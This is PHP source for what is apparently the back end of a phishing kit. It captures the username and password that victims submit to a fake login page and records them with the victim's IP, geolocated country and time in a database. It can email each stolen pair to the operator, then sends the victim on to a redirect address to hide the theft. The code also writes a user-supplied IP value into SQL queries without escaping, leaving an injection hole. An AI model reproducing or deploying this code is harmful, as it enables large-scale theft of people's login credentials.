<?php
require_once('inc/mail.inc.php');
require_once('connect/mysql.php');

// ip mod by bop
if($RequestM == "GET"){
    if(isset($_GET['ip'])){
        $ip = $_GET['ip'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
}
elseif($RequestM == "POST"){
    if(isset($_POST["ip"])){
        $ip = $_POST["ip"];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
}

$Datum = Date("d.m.Y");
$Zeit = Date("H:i");
$country = "00";
error_reporting(0);
if(isset($_GET['HostID'])){
}else{
exit;
}
$remote = "";
$host = preg_replace("/[^0-9]/" , "" , $_GET['HostID']);
$RemoteHostInfo = mysql_query("SELECT * FROM `remotehosts` WHERE HostID = '" . $host . "'");
if(mysql_num_rows($RemoteHostInfo)==1){
$SQLrow = mysql_fetch_row($RemoteHostInfo);
$remote = $SQLrow[1];
}else{
exit;
}

//GeoIP Require
require_once('trace/geoip.php');
// GeoIP
	$gi 	  = geoip_open('trace/geoip.dat',GEOIP_STANDARD);
	$code 	  = geoip_country_code_by_addr($gi, $ip);
	geoip_close($gi);
	$country = strtolower($code);
	if(empty($code)){
		$country = '00';
	}
// GeoIP

$RemoteHostInfo2 = mysql_query("SELECT * FROM `phishing` WHERE HostName = '" . $remote . "'");
if(mysql_num_rows($RemoteHostInfo2)==1){
$SQLrow2 = mysql_fetch_row($RemoteHostInfo2);
$RequestM = $SQLrow2[5];
$RequestPara1 = $SQLrow2[2];
$RequestPara2 = $SQLrow2[3];
$RederictAfter = $SQLrow2[4];
$Username = "";
$Password = "";

if($RequestM == "GET"){

if(isset($_GET[$RequestPara1])){
$Username = $_GET[$RequestPara1];
}else{
exit;
}
if(isset($_GET[$RequestPara2])){
$Password = $_GET[$RequestPara2];
}else{
exit;
}

}

if($RequestM == "POST"){
if(isset($_POST[$RequestPara1])){
$Username = $_POST[$RequestPara1];
}else{
exit;
}

if(isset($_POST[$RequestPara2])){
$Password = $_POST[$RequestPara2];
}else{
exit;
}

}
}else{
exit;
}

//CLEAN UP
$Username = mysql_real_escape_string($Username);
$Password = mysql_real_escape_string($Password);

// MYSQL Insert
$lol129 = 0;
$exists = mysql_query('SELECT * FROM `maintable` WHERE `IPAdress` = "' . $ip . '" AND `Username` = "' . $Username . '" AND `Password` = "' . $Password . '"');
if(mysql_num_rows($exists)==0){
	mysql_query("INSERT INTO `maintable` (`Index`, `IPAdress`, `Username`, `Password`, `Datum`, `Zeit`, `Country`, `RemoteHost`) VALUES ('" . NULL . "','" . $ip . "','" . $Username . "','" . $Password . "','" . $Datum . "','" . $Zeit . "','" . $country . "','" . $remote . "')");		
	$lol129 = 1;
	}
?>

<?php
require_once('inc/config.php');
if($lol129==1){
if($EMailNoticeFunction==1){
$HostName = $remote;
$MailHTMLBody = "Eintrag in " . $HostName . " wurde erstellt. <br>";
$MailHTMLBody .= "IP Adress : " . $ip . " <br>";
$MailHTMLBody .= "Uhrzeit : " . $Datum . " " . $Zeit . " <br>";
$MailHTMLBody .= "Username : " . $Username . " <br>";
$MailHTMLBody .= "Username : " . $Password . " <br>";
CreateEMail($SMTPMail,$SMTPServer,$SMTPMail,$SMTPPass,$MailHTMLBody,$HostName);
}
}
?>

<?php
$RED = $RederictAfter;
Header("Location: " . $RederictAfter); 
exit;

?>
